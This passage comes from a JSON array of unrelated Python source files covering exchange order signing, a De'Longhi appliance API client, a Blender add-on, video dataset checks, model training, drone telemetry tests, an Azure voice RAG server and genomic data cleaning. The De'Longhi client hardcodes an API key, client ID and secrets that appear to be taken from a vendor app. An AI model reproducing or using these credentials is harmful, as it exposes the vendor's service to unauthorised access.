asset_address=instrument_ticker[\"base_asset_address\"],\n            sub_id=int(instrument_ticker[\"base_asset_sub_id\"]),\n            limit_price=Decimal(str(limit_price)),\n            amount=Decimal(str(amount)),\n            max_fee=Decimal(\"10000\"),\n            recipient_id=wallet_data['subacc_id'],\n            is_bid=is_bid,\n        ),\n        DOMAIN_SEPARATOR=DOMAIN_SEPARATOR,\n        ACTION_TYPEHASH=ACTION_TYPEHASH,\n    )\n\n\ndef send_order(wallet_data, instrument_ticker, direction, action, headers):\n    payload = {\n        \"instrument_name\": instrument_ticker[\"instrument_name\"],\n        \"direction\": direction,\n        \"order_type\": \"market\",\n        \"time_in_force\": \"gtc\",\n        **action.to_json(),\n    }\n\n    response = requests.post(\n        ORDER_ENDPOINT,\n        json=payload,\n        headers=headers,\n        proxies=wallet_data['proxy']\n    )\n    return response\n\n\ndef open_order(wallet_data, instrument_ticker, amount, direction):\n    eoa_wallet = Web3().eth.account.from_key(wallet_data['session_pk'])\n    lyra_signature, timestamp_ms = create_timestamp_signature(wallet_data['session_pk'])\n\n    limit_price = instrument_ticker['max_price'] if direction == \"long\" else instrument_ticker['min_price']\n    is_bid = direction == \"long\"\n\n    action = create_action(wallet_data, eoa_wallet, instrument_ticker, amount, limit_price, is_bid)\n    action.sign(wallet_data['session_pk'])\n\n    headers = {\n        \"X-LyraWallet\": wallet_data['derive_wallet'],\n        \"X-LyraTimestamp\": timestamp_ms,\n        \"X-LyraSignature\": lyra_signature\n    }\n\n    response = send_order(wallet_data, instrument_ticker, \"buy\" if is_bid else \"sell\", action, headers)\n    return response\n\n\ndef open_long(wallet_data, instrument_ticker, amount):\n    # return\n    return open_order(wallet_data, instrument_ticker, amount, \"long\")\n\n\ndef open_short(wallet_data, instrument_ticker, amount):\n    # return\n    return open_order(wallet_data, instrument_ticker, amount, \"short\")\n",
    "import base64\nimport json\nimport os\nimport requests\nimport getpass\nimport urllib.parse\nfrom datetime import datetime\n\n# Thanks to https://github.com/duckwc/ECAMpy for the code to token convertion\n\nSDK_BUILD = 16650\n\nAPI_KEY = \"3_e5qn7USZK-QtsIso1wCelqUKAK_IVEsYshRIssQ-X-k55haiZXmKWDHDRul2e5Y2\"\nCLIENT_ID = \"1S8q1WJEs-emOB43Z0-66WnL\"\nCLIENT_SECRET = \"lmnceiD0B-4KPNN5ZS6WuWU70j9V5BCuSlz2OPsvHkyLryhMkJkPvKsivfTq3RfNYj8GpCELtOBvhaDIzKcBtg\"\nAUTHORIZATION_HEADER = (\n    \"Basic \" + base64.b64encode(f\"{CLIENT_ID}:{CLIENT_SECRET}\".encode()).decode()\n)\nAPP_ID = \"DeLonghiComfort2-mw-id\"\nAPP_SECRET = \"DeLonghiComfort2-Yg4miiqiNcf0Or-EhJwRh7ACfBY\"\n\nBROWSER_USER_AGENT = \"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/79.0.3945.73 Mobile/15E148 Safari/604.1\"\nTOKEN_USER_AGENT = \"DeLonghiComfort/3 CFNetwork/1568.300.101 Darwin/24.2.0\"\nAPI_USER_AGENT = \"DeLonghiComfort/5.1.1 (iPhone; iOS 18.2; Scale/3.00)\"\n\nREFRESH_TOKEN_FILE = \"refresh_token.txt\"\n\nLANGUAGES = {\n    \"en\": \"GB\",\n    \"pt\": \"PT\",\n    \"en-ca\": \"CA\",\n    \"fr-ca\": \"CA\",\n    \"es-mx\": \"MX\",\n    \"es-co\": \"CO\",\n    \"es-pe\": \"PE\",\n    \"en-us\": \"US\",\n    \"pt-br\": \"BR\",\n    \"es-cl\": \"CL\",\n    \"en-za\": \"ZA\",\n    \"es\": \"ES\",\n    \"fr\": \"FR\",\n    \"lu\": \"LU\",\n    \"nl\": \"NL\",\n    \"my\": \"MY\",\n    \"fr-be\": \"BE\",\n    \"nl-inf\": \"BE\",\n    \"de\": \"DE\",\n    \"fr-ch\": \"CH\",\n    \"de-inf\": \"CH\",\n    \"it\": \"IT\",\n    \"mt-mt\": \"MT\",\n    \"en-mt\": \"MT\",\n    \"hr\": \"HR\",\n    \"sr\": \"RS\",\n    \"sl\": \"SI\",\n    \"br\": \"BG\",\n    \"el\": \"GR\",\n    \"ro\": \"RO\",\n    \"tr\": \"TR\",\n    \"cs\": \"CZ\",\n    \"sk\": \"SK\",\n    \"hu\": \"HU\",\n    \"de-at\": \"AT\",\n    \"uk\": \"UA\",\n    \"sv\": \"SE\",\n    \"fi\": \"FI\",\n    \"no\": \"NO\",\n    \"da\": \"DK\",\n    \"pl\": \"PL\",\n    \"et-ee\": \"EE\",\n    \"lt-lt\": \"LT\",\n    \"lv-lv\": \"LV\",\n    \"en-ae\": \"AE\",\n    \"ar-ae\": \"AE\",\n    \"en-sg\": \"SG\",\n    \"en-my\": \"MY\",\n    \"en-au\": \"AU\",\n    \"en-nz\": \"NZ\",\n    \"ja\": \"JP\",\n    \"ko\": \"KR\",\n    \"en-kh\": \"KH\",\n    \"en-hk\": \"HK\",\n    \"en-bd\": \"BD\",\n    \"en-th\": \"TH\",\n    \"th\": \"TH\",\n    \"es-ar\": \"AR\",\n    \"ar-eg\": \"EG\",\n    \"en-eg\": \"EG\",\n    \"en-in\": \"IN\",\n    \"en-ir\": \"IR\",\n    \"fa\": \"IR\",\n    \"en-il\": \"IL\",\n    \"en-sa\": \"SA\",\n    \"ar-sa\": \"SA\",\n    \"en-ie\": \"IE\",\n    \"en-id\": \"ID\",\n    \"en-ph\": \"PH\",\n    \"zh-tw\": \"TW\",\n    \"en-om\": \"OM\",\n    \"en-qa\": \"QA\",\n    \"en-bh\": \"BH\",\n    \"en-kw\": \"KW\",\n    \"vi\": \"VN\",\n}\n\nLANGUAGE_COMMS_KEYS = {\n    \"CA\": \"profiledCommunicationCA\",\n    \"MX\": \"profiledCommunicationMXCO\",\n    \"CO\": \"profiledCommunicationMXCO\",\n    \"US\": \"profiledCommunicationUS\",\n    \"BR\": \"profiledCommunicationBR\",\n    \"CL\": \"profiledCommunicationCL\",\n    \"AR\": \"profiledCommunicationCL\",\n    \"PE\": \"profiledCommunicationCL\",\n    \"ZA\": \"profiledCommunicationZA\",\n    \"PT\": \"profiledCommunicationPT\",\n    \"ES\": \"profiledCommunicationES\",\n    \"GB\": \"profiledCommunicationGB\",\n    \"IE\": \"profiledCommunicationGB\",\n    \"FR\": \"profiledCommunicationFR\",\n    \"NL\": \"profiledCommunicationNL\",\n    \"BE\": \"profiledCommunicationBE\",\n    \"LU\": \"profiledCommunicationBE\",\n    \"DE\": \"profiledCommunicationDE\",\n    \"CH\": \"profiledCommunicationCH\",\n    \"IT\": \"profiledCommunicationIT\",\n    \"MT\": \"profiledCommunicationHRRSSIBG\",\n    \"HR\": \"profiledCommunicationHRRSSIBG\",\n    \"RS\": \"profiledCommunicationHRRSSIBG\",\n    \"SI\": \"profiledCommunicationHRRSSIBG\",\n    \"BG\": \"profiledCommunicationHRRSSIBG\",\n    \"GR\": \"profiledCommunicationGR\",\n    \"RO\": \"profiledCommunicationRO\",\n    \"TR\": \"profiledCommunicationTR\",\n    \"CZ\": \"profiledCommunicationCZSKHU\",\n    \"SK\": \"profiledCommunicationCZSKHU\",\n    \"HU\": \"profiledCommunicationCZSKHU\",\n    \"AT\": \"profiledCommunicationAT\",\n    \"UA\": \"profiledCommunicationUA\",\n    \"SE\": \"profiledCommunicationSEFINODK\",\n    \"FI\": \"profiledCommunicationSEFINODK\",\n    \"NO\": \"profiledCommunicationSEFINODK\",\n    \"DK\": \"profiledCommunicationSEFINODK\",\n    \"PL\": \"profiledCommunicationPLEELTLV\",\n    \"EE\": \"profiledCommunicationPLEELTLV\",\n    \"LT\": \"profiledCommunicationPLEELTLV\",\n    \"LV\": \"profiledCommunicationPLEELTLV\",\n    \"AE\": \"profiledCommunicationAE\",\n    \"EG\": \"profiledCommunicationAE\",\n    \"IN\": \"profiledCommunicationAE\",\n    \"IR\": \"profiledCommunicationAE\",\n    \"IL\": \"profiledCommunicationAE\",\n    \"SA\": \"profiledCommunicationAE\",\n    \"OM\": \"profiledCommunicationAE\",\n    \"QA\": \"profiledCommunicationAE\",\n    \"BH\": \"profiledCommunicationAE\",\n    \"KW\": \"profiledCommunicationAE\",\n    \"SG\": \"profiledCommunicationSG\",\n    \"MY\": \"profiledCommunicationMY\",\n    \"AU\": \"profiledCommunicationAU\",\n    \"NZ\": \"profiledCommunicationNZ\",\n    \"JP\": \"profiledCommunicationJP\",\n    \"KR\": \"profiledCommunicationKR\",\n    \"KH\": \"profiledCommunicationHKBDKHTH\",\n    \"HK\": \"profiledCommunicationHKBDKHTH\",\n    \"BD\": \"profiledCommunicationHKBDKHTH\",\n    \"TH\": \"profiledCommunicationHKBDKHTH\",\n    \"ID\": \"profiledCommunicationHKBDKHTH\",\n    \"PH\": \"profiledCommunicationHKBDKHTH\",\n    \"TW\": \"profiledCommunicationHKBDKHTH\",\n    \"VN\": \"profiledCommunicationHKBDKHTH\",\n}\n\nLANGUAGE_COUNTRIES = {\n    \"en\": \"United Kingdom\",\n    \"pt\": \"Portugal\",\n",
    "\r\nimport bpy\r\nfrom bpy.types import Operator, AddonPreferences\r\nfrom bpy.props import StringProperty, FloatProperty, EnumProperty\r\nfrom bpy_extras.object_utils import AddObjectHelper, object_data_add\r\n\r\nfrom datetime import datetime\r\nfrom os import linesep\r\n\r\nclass AutoSubmissionProofPreferences(AddonPreferences):\r\n    # This must match the add-on name, use `__package__`\r\n    # when defining this for add-on extensions or a sub-module of a python package.\r\n    bl_idname = __package__\r\n\r\n    username: StringProperty(\r\n        name = \"Discord Username\"\r\n    )\r\n\r\n    thickness: FloatProperty(\r\n        name = \"Default Thickness\",\r\n        default = 4.0\r\n    )\r\n\r\n    dateformat: EnumProperty(\r\n        name = \"Date Format\",\r\n        items = [\r\n            ('%d/%m/%y', 'UK/EU: dd/mm/yyyy', ''),\r\n            ('%m/%d/%y', 'US: mm/dd/yyyy', '')\r\n        ]\r\n    )\r\n\r\n    def draw(self, context):\r\n        layout = self.layout\r\n        layout.prop(self, \"username\")\r\n        layout.prop(self, \"thickness\")\r\n        layout.prop(self, \"dateformat\")\r\n\r\n\r\ndef add_object(self, context):\r\n    my_prefs = bpy.context.preferences.addons[__package__].preferences\r\n    my_username = my_prefs.username\r\n\r\n    my_date_string = datetime.now().strftime(my_prefs.dateformat)\r\n        \r\n    text_curve = bpy.data.curves.new(type=\"FONT\", name=\"Submission Proof\")\r\n\r\n    text_curve.body = my_username + linesep + my_date_string\r\n    text_curve.extrude = my_prefs.thickness\r\n    text_obj = bpy.data.objects.new(name=\"SubmissionProof\", object_data=text_curve)\r\n\r\n\r\n    bpy.context.scene.collection.objects.link(text_obj)\r\n\r\n\r\nclass OBJECT_OT_add_object(Operator):\r\n    \"\"\"Create a thick text object with discord username and today's date\"\"\"\r\n    bl_idname = \"curves.auto_submission_proof\"\r\n    bl_label = \"Add Submission Proof\"\r\n    bl_options = {'REGISTER', 'UNDO'}\r\n\r\n    def execute(self, context):\r\n\r\n        add_object(self, context)\r\n\r\n        return {'FINISHED'}\r\n\r\n\r\n# Registration\r\n\r\ndef add_object_button(self, context):\r\n    self.layout.operator(\r\n        OBJECT_OT_add_object.bl_idname,\r\n        text=\"Add Submission Proof\",\r\n        icon='OUTLINER_OB_FONT')\r\n\r\ndef register():\r\n    bpy.utils.register_class(AutoSubmissionProofPreferences)\r\n\r\n    bpy.utils.register_class(OBJECT_OT_add_object)\r\n    bpy.types.VIEW3D_MT_mesh_add.append(add_object_button)\r\n\r\n\r\ndef unregister():\r\n    bpy.utils.unregister_class(AutoSubmissionProofPreferences)\r\n    \r\n    bpy.utils.unregister_class(OBJECT_OT_add_object)\r\n    bpy.types.VIEW3D_MT_mesh_add.remove(add_object_button)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    register()\r\n",
    "# Copyright (c) OpenMMLab. All rights reserved.\nimport argparse\nimport os\nimport warnings\nfrom functools import partial\nfrom multiprocessing import Manager, cpu_count\n\nimport numpy as np\nfrom mmengine import Config, DictAction, track_parallel_progress\nfrom mmengine.registry import init_default_scope\n\nfrom mmaction.registry import DATASETS, TRANSFORMS\n\n\ndef parse_args():\n    parser = argparse.ArgumentParser(description='MMAction2 check datasets')\n    parser.add_argument('config', help='test config file path')\n    parser.add_argument(\n        '--options',\n        nargs='+',\n        action=DictAction,\n        default={},\n        help='custom options for evaluation, the key-value pair in xxx=yyy '\n        'format will be kwargs for dataset.evaluate() function (deprecate), '\n        'change to --eval-options instead.')\n    parser.add_argument(\n        '--cfg-options',\n        nargs='+',\n        action=DictAction,\n        default={},\n        help='override some settings in the used config, the key-value pair '\n        'in xxx=yyy format will be merged into config file. For example, '\n        \"'--cfg-options model.backbone.depth=18 model.backbone.with_cp=True'\")\n    parser.add_argument(\n        '--output-file',\n        default='invalid-video.txt',\n        help='Output file path which keeps corrupted/missing video file paths')\n    parser.add_argument(\n        '--split',\n        default='train',\n        choices=['train', 'val', 'test'],\n        help='Dataset split')\n    parser.add_argument(\n        '--decoder',\n        default='decord',\n        choices=['decord', 'opencv', 'pyav'],\n        help='Video decoder type, should be one of [decord, opencv, pyav]')\n    parser.add_argument(\n        '--nproc',\n        type=int,\n        default=(cpu_count() - 1 or 1),\n        help='Number of processes to check videos')\n    parser.add_argument(\n        '--remove-corrupted-videos',\n        action='store_true',\n        help='Whether to delete all corrupted videos')\n    args = parser.parse_args()\n\n    if args.options and args.eval_options:\n        raise ValueError(\n            '--options and --eval-options cannot be both '\n            'specified, --options is deprecated in favor of --eval-options')\n    if args.options:\n        warnings.warn('--options is deprecated in favor of --eval-options')\n        args.eval_options = args.options\n    return args\n\n\n@TRANSFORMS.register_module()\nclass RandomSampleFrames:\n\n    def __call__(self, results):\n        \"\"\"Select frames to verify.\n\n        Select the first, last and three random frames, Required key is\n        \"total_frames\", added or modified key is \"frame_inds\".\n        Args:\n            results (dict): The resulting dict to be modified and passed\n                to the next transform in pipeline.\n        \"\"\"\n        assert results['total_frames'] > 0\n\n        # first and last frames\n        results['frame_inds'] = np.array([0, results['total_frames'] - 1])\n\n        # choose 3 random frames\n        if results['total_frames'] > 2:\n            results['frame_inds'] = np.concatenate([\n                results['frame_inds'],\n                np.random.randint(1, results['total_frames'] - 1, 3)\n            ])\n\n        return results\n\n\ndef _do_check_videos(lock, pipeline, output_file, data_info):\n    try:\n        pipeline(data_info)\n    except:  # noqa\n        # save invalid video path to output file\n        lock.acquire()\n        with open(output_file, 'a') as f:\n            f.write(data_info['filename'] + '\\n')\n        lock.release()\n\n\nif __name__ == '__main__':\n    args = parse_args()\n\n    decoder_to_pipeline_prefix = dict(\n        decord='Decord', opencv='OpenCV', pyav='PyAV')\n\n    # read config file\n    cfg = Config.fromfile(args.config)\n    cfg.merge_from_dict(args.cfg_options)\n    init_default_scope(cfg.get('default_scope', 'mmaction'))\n\n    # build dataset\n    dataset_cfg = cfg.get(f'{args.split}_dataloader').dataset\n    dataset_type = dataset_cfg.type\n    assert dataset_type == 'VideoDataset'\n    dataset_cfg.pipeline = [\n        dict(type=decoder_to_pipeline_prefix[args.decoder] + 'Init'),\n        dict(type='RandomSampleFrames'),\n        dict(type=decoder_to_pipeline_prefix[args.decoder] + 'Decode')\n    ]\n\n    dataset = DATASETS.build(dataset_cfg)\n    dataset_cfg.pop('type')\n    pipeline = dataset.pipeline\n\n    # prepare for checking\n    if os.path.exists(args.output_file):\n        # remove existing output file\n        os.remove(args.output_file)\n\n    lock = Manager().Lock()\n    worker_fn = partial(_do_check_videos, lock, pipeline, args.output_file)\n    # avoid copy dataset for multiprocess\n    data_info_list = [\n        dataset.get_data_info(idx) for idx in range(len(dataset))\n    ]\n\n    # start checking\n    track_parallel_progress(worker_fn, data_info_list, nproc=args.nproc)\n\n    if os.path.exists(args.output_file):\n        num_lines = sum(1 for _ in open(args.output_file))\n        print(f'Checked {len(dataset)} videos, '\n              f'{num_lines} are corrupted/missing.')\n        ",
    "import torch\nimport torch.optim as optim\nimport torch.nn.functional as F\nfrom torch.utils.data import DataLoader\nfrom torchvision import transforms\nfrom tqdm import tqdm  # For progress bar\nfrom TriAttNet import TriAttNet\nfrom load_dataset import *\nfrom evaluation import *\nfrom torch.optim.lr_scheduler import CosineAnnealingLR  # Import scheduler\n\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n\nmodel = TriAttNet().to(device)\noptimizer = optim.Adam(model.parameters(), lr=1e-4)\ncriterion = torch.nn.MSELoss()\n\ntrain_dataloader = processing_dataset()\ntest_dataloader = processing_dataset('data/DIV2K_valid_HR')\nscheduler = CosineAnnealingLR(optimizer, T_max=100, eta_min=1e-6)\n# Training loop\nnum_epochs = 100  # You can adjust this based on your needs\nfor epoch in range(num_epochs):\n    model.train()  \n    running_loss = 0.0\n    for batch_idx, (lr_images, hr_images) in tqdm(enumerate(train_dataloader), total=len(train_dataloader)):\n        lr_images, hr_images = lr_images.to(device), hr_images.to(device)\n        sr_images = model(lr_images)\n        loss = criterion(sr_images, hr_images)\n\n        optimizer.zero_grad()\n        loss.backward()\n        optimizer.step()\n\n        # Accumulate the loss\n        running_loss += loss.item()\n\n    epoch_loss = running_loss / len(train_dataloader)\n    print(f\"Epoch [{epoch+1}/{num_epochs}], Loss: {epoch_loss:.4f}\")\n    # Validation\n    model.eval()\n    val_psnr, val_ssim = [], []\n    with torch.no_grad():\n        for batch_idx, (lr_images, hr_images) in enumerate(tqdm(test_dataloader, desc=f\"Validating Epoch {epoch+1}/{num_epochs}\")):\n            lr_images, hr_images = lr_images.to(device), hr_images.to(device)\n            sr_images = model(lr_images)\n            psnr_value = calculate_psnr(hr_images, sr_images)\n            ssim_value = calculate_ssim(hr_images, sr_images)\n\n            val_psnr.append(psnr_value)\n            val_ssim.append(ssim_value)\n                    \n    avg_psnr = sum(val_psnr) / len(val_psnr)\n    avg_ssim = sum(val_ssim) / len(val_ssim)\n    print(f\"Validation PSNR: {avg_psnr:.4f}, SSIM: {avg_ssim:.4f}\")\n    with open(\"epoch_log_train.txt\", \"a\") as log_file:\n        log_file.write(f\"{epoch+1}\\t{epoch_loss :.4f}\\t{avg_psnr:.4f}\\t{avg_ssim:.4f}\\n\")\n    scheduler.step()\n    \n    if (epoch + 1) % 5 == 0:\n        torch.save(model.state_dict(), f\"model_epoch_{epoch+1}.pth\")\n\nprint(\"Training complete!\")",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n#\n# Copyright Sensors & Signals LLC https://www.snstac.com/\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\n\"\"\"DJICOT Function Tests.\"\"\"\n\n\nimport struct\nimport unittest\nfrom djicot.dji_functions import parse_frame, parse_data\n\n\nclass DJIFunctionsTestCase(unittest.TestCase):\n    \"\"\"\n    Test class for functions... functions.\n    \"\"\"\n\n    def test_parse_frame(self):\n        \"\"\"Test parse_frame function with valid frame data.\"\"\"\n        frame = bytearray(10)\n        frame[:2] = b\"\\x01\\x02\"  # frame_header\n        frame[2] = 0x03  # package_type\n        frame[3:5] = struct.pack(\"H\", 10)  # package_length\n        frame[5:10] = b\"hello\"  # data\n\n        package_type, data = parse_frame(frame)\n        self.assertEqual(package_type, 0x03)\n        self.assertEqual(data, b\"hello\")\n\n    def test_parse_frame_with_invalid_length(self):\n        \"\"\"Test parse_frame function with invalid length.\"\"\"\n        frame = bytearray(8)\n        frame[:2] = b\"\\x01\\x02\"  # frame_header\n        frame[2] = 0x03  # package_type\n        frame[3:5] = struct.pack(\"H\", 10)  # package_length\n        frame[5:8] = b\"hel\"  # data\n\n        package_type, data = parse_frame(frame)\n        self.assertEqual(package_type, 0x03)\n        self.assertEqual(data, b\"hel\")\n\n    def test_parse_data(self):\n        \"\"\"Test parse_data function with valid data.\"\"\"\n\n        data = bytearray(227)\n        data[:64] = b\"serial_number\".ljust(64, b\"\\x00\")\n        data[64:128] = b\"device_type\".ljust(64, b\"\\x00\")\n        data[128] = 8\n        data[129:137] = struct.pack(\"d\", 37.7749)  # app_lat\n        data[137:145] = struct.pack(\"d\", -122.4194)  # app_lon\n        data[145:153] = struct.pack(\"d\", 37.7749)  # uas_lat\n        data[153:161] = struct.pack(\"d\", -122.4194)  # uas_lon\n        data[161:169] = struct.pack(\"d\", 100.0)  # height\n        data[169:177] = struct.pack(\"d\", 200.0)  # altitude\n        data[177:185] = struct.pack(\"d\", 37.7749)  # home_lat\n        data[185:193] = struct.pack(\"d\", -122.4194)  # home_lon\n        data[193:201] = struct.pack(\"d\", 2.4)  # freq\n        data[201:209] = struct.pack(\"d\", 10.0)  # speed_e\n        data[209:217] = struct.pack(\"d\", 5.0)  # speed_n\n        data[217:225] = struct.pack(\"d\", 1.0)  # speed_u\n        data[225:227] = struct.pack(\"h\", -50)  # rssi\n\n        parsed_data = parse_data(data)\n        self.assertEqual(parsed_data.get(\"serial_number\"), \"serial_number\")\n        self.assertEqual(parsed_data.get(\"device_type\"), \"device_type\")\n        self.assertEqual(parsed_data.get(\"device_type_8\"), 8)\n        self.assertEqual(parsed_data.get(\"op_lat\"), 37.7749)\n        self.assertEqual(parsed_data.get(\"op_lon\"), -122.4194)\n        self.assertEqual(parsed_data.get(\"uas_lat\"), 37.7749)\n        self.assertEqual(parsed_data.get(\"uas_lon\"), -122.4194)\n        self.assertEqual(parsed_data.get(\"height\"), 100.0)\n        self.assertEqual(parsed_data.get(\"altitude\"), 200.0)\n        self.assertEqual(parsed_data.get(\"home_lat\"), 37.7749)\n        self.assertEqual(parsed_data.get(\"home_lon\"), -122.4194)\n        self.assertEqual(parsed_data.get(\"freq\"), 2.4)\n        self.assertEqual(parsed_data.get(\"speed_e\"), 10.0)\n        self.assertEqual(parsed_data.get(\"speed_n\"), 5.0)\n        self.assertEqual(parsed_data.get(\"speed_u\"), 1.0)\n        self.assertEqual(parsed_data.get(\"rssi\"), -50)\n\n    def _test_parse_data_with_invalid_data(self):\n        \"\"\"Test parse_data function with invalid data.\"\"\"\n        data = b\"invalid_data\"\n        parsed_data = parse_data(data)\n        self.assertEqual(\n            parsed_data[\"device_type\"],\n            \"Unknown DJI OcuSync Format (Encrypted or Partial Data)\",\n        )\n        self.assertEqual(parsed_data[\"device_type_8\"], 255)\n\n    def test_parse_frame_with_package_type_0x01(self):\n        \"\"\"Test parse_frame function with package_type 0x01.\"\"\"\n        frame = bytearray(10)\n        frame[:2] = b\"\\x01\\x02\"  # frame_header\n        frame[2] = 0x01  # package_type\n        frame[3:5] = struct.pack(\"H\", 10)  # package_length\n        frame[5:10] = b\"hello\"  # data\n\n        package_type, data = parse_frame(frame)\n        self.assertEqual(package_type, 0x01)\n        self.assertEqual(data, b\"hello\")\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n",
    "import logging\nimport os\nfrom pathlib import Path\n\nfrom aiohttp import web\nfrom azure.core.credentials import AzureKeyCredential\nfrom azure.identity import AzureDeveloperCliCredential, DefaultAzureCredential\nfrom dotenv import load_dotenv\n\nfrom ragtools import attach_rag_tools\nfrom rtmt import RTMiddleTier\n\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(\"voicerag\")\n\nasync def create_app():\n    if not os.environ.get(\"RUNNING_IN_PRODUCTION\"):\n        logger.info(\"Running in development mode, loading from .env file\")\n        load_dotenv()\n\n    llm_key = os.environ.get(\"AZURE_OPENAI_API_KEY\")\n    search_key = os.environ.get(\"AZURE_SEARCH_API_KEY\")\n\n    credential = None\n    if not llm_key or not search_key:\n        if tenant_id := os.environ.get(\"AZURE_TENANT_ID\"):\n            logger.info(\"Using AzureDeveloperCliCredential with tenant_id %s\", tenant_id)\n            credential = AzureDeveloperCliCredential(tenant_id=tenant_id, process_timeout=60)\n        else:\n            logger.info(\"Using DefaultAzureCredential\")\n            credential = DefaultAzureCredential()\n    llm_credential = AzureKeyCredential(llm_key) if llm_key else credential\n    search_credential = AzureKeyCredential(search_key) if search_key else credential\n    \n    app = web.Application()\n\n    rtmt = RTMiddleTier(\n        credentials=llm_credential,\n        endpoint=os.environ[\"AZURE_OPENAI_ENDPOINT\"],\n        deployment=os.environ[\"AZURE_OPENAI_REALTIME_DEPLOYMENT\"],\n        voice_choice=os.environ.get(\"AZURE_OPENAI_REALTIME_VOICE_CHOICE\") or \"alloy\"\n        )\n    rtmt.system_message = \"You are a helpful assistant. ONLY answer questions based on information you searched in the knowledge base, accessible with the 'search' tool. \" + \\\n                          \"The user is listening to answers with audio, so it's *super* important that answers are as short as possible, a single sentence if at all possible. \" + \\\n                          \"Never read file names or source names or keys out loud. \" + \\\n                          \"Always use the following step-by-step instructions to respond: \\n\" + \\\n                          \"1. Always use the 'search' tool to check the knowledge base before answering a question. \\n\" + \\\n                          \"2. Always use the 'report_grounding' tool to report the source of information from the knowledge base. \\n\" + \\\n                          \"3. Produce an answer that's as short as possible. If the answer isn't in the knowledge base, say you don't know.\"\n    attach_rag_tools(rtmt,\n        credentials=search_credential,\n        search_endpoint=os.environ.get(\"AZURE_SEARCH_ENDPOINT\"),\n        search_index=os.environ.get(\"AZURE_SEARCH_INDEX\"),\n        semantic_configuration=os.environ.get(\"AZURE_SEARCH_SEMANTIC_CONFIGURATION\") or \"default\",\n        identifier_field=os.environ.get(\"AZURE_SEARCH_IDENTIFIER_FIELD\") or \"chunk_id\",\n        content_field=os.environ.get(\"AZURE_SEARCH_CONTENT_FIELD\") or \"chunk\",\n        embedding_field=os.environ.get(\"AZURE_SEARCH_EMBEDDING_FIELD\") or \"text_vector\",\n        title_field=os.environ.get(\"AZURE_SEARCH_TITLE_FIELD\") or \"title\",\n        use_vector_query=(os.environ.get(\"AZURE_SEARCH_USE_VECTOR_QUERY\") == \"true\") or True\n        )\n\n    rtmt.attach_to_app(app, \"/realtime\")\n\n    current_directory = Path(__file__).parent\n    app.add_routes([web.get('/', lambda _: web.FileResponse(current_directory / 'static/index.html'))])\n    app.router.add_static('/', path=current_directory / 'static', name='static')\n    \n    return app\n\nif __name__ == \"__main__\":\n    host = \"localhost\"\n    port = 8765\n    web.run_app(create_app(), host=host, port=port)\n",
    "\"\"\"\n    This module contains the functions for data processing of the HRAS dataset.\n    1. This should be the first module to be executed for Hras.\n\"\"\"\n\nimport pandas as pd\nimport numpy as np\nimport re\n\nfrom src.pfam.pfam_json import get_pfam_data, create_domain_dict, assign_conservation\nfrom src.config import HRAS_ACCESSION, HRAS_MODEL_NAME, HRAS_NM\nfrom src.fasta import fasta_seq \n\ndef hras_data_clean_extract(dataset: pd.DataFrame, pfam = True, email = \"fia@unisa.it\") -> pd.DataFrame:\n    \"\"\"\n    Note:\n    -----\n    This function could use EntreZ to retrieve the sequence data in FASTA format \n    if it is not available locally. The email is required for this operation.\n\n    Clean the HRAS data.\n    1. Filter rows to keep only SNPs.\n    2. Remove unnecessary columns.\n    3. Extract cDNA Ref and Mut.\n    4. Filter out rows where the 'Name' column starts with \"NC_\".\n    5. Extract `Position` from `Name` column.\n    6. Extract AA Ref and Mut.\n    7. Drop of `Name` column as it is not useful anymore.\n    8. Add `Conservation` column if isPfam is True, else add `Domain` column.\n    9. Impute WT and Mutant codons from the sequence data. Fasta sequence data is used for this.\n    9. Rename `Germline classification` column in `Pathogenicity` for consistency.\n\n    Parameters:\n        dataset (pd.DataFrame): The HRAS dataset to clean.\n        isPfam (bool): If the dataset will use Pfam for Domain evaluation Score in `Conservation` column. Default is True.\n        email (str): The email to use for the Fasta sequence retrieval.\n\n    Returns:\n        pd.DataFrame: The cleaned HRAS data.\n    \"\"\"\n    # Data Cleaning #\n\n    # Filter rows: only SNPs\n    data = __filter_rows(dataset) # Variant type: single nucleotide variant\n\n    # Remove unnecessary columns\n    data = __drop_columns(data) # Also variant type column will be removed\n\n    # Feature Selection #\n\n    # Extract cDNA Ref and Mut\n    data = __ref_mut_cDNA_extraction(data)\n\n    # Filter out rows where the 'Name' column starts with \"NC_\" \n    # NC: Chromosome RefSeq not useful for our analysis\n    data = data[~data['Name'].str.startswith('NC_', na=False)]\n\n    # Extract `Position` from `Name` column\n    data = __extract_position(data)\n\n    # Extract AA Ref and Mut\n    data = __extract_aa_ref_mut(data)\n    \n    # Drop of `Name` column as it is not useful anymore\n    data = data.drop(columns=['Name'])\n\n    if pfam:\n        # Add `Conservation` column\n        data = add_pfam_conservation(data)\n    else:\n        # Add `Domain` column\n        data = __assign_domain_basic(data)\n    \n    # Impute WT and Mutant codons from the sequence data\n    data = impute_codon_from_sequence(data, email)\n\n    # Rename `Germline classification` column in `Pathogenicity` for consistency\n    data = data.rename(columns={'Germline classification': 'Pathogenicity'})\n\n    return data\n\n\ndef __filter_rows(data: pd.DataFrame) -> pd.DataFrame:\n    \"\"\"\n    Filter rows to keep only SNPs.\n    \"\"\"\n    # Filter by 'Variant type' : 'single nucleotide variant'\n    return data[data['Variant type'] == 'single nucleotide variant']\n\n\ndef __drop_columns(data: pd.DataFrame) -> pd.DataFrame:\n    \"\"\"\n    Drop unnecessary columns from the HRAS data.\n    \"\"\"\n    # Columns to Remove\n    columns_to_drop = [\n        'Protein change', 'Condition(s)', 'Accession', 'GRCh37Chromosome', 'GRCh37Location' ,'GRCh38Chromosome',\n        'GRCh38Location', 'VariationID', 'AlleleID(s)', 'dbSNP ID', 'Canonical SPDI',\n        'Variant type', 'Germline date last evaluated', 'Germline review status',\n        'Somatic clinical impact', 'Somatic clinical impact date last evaluated',\n 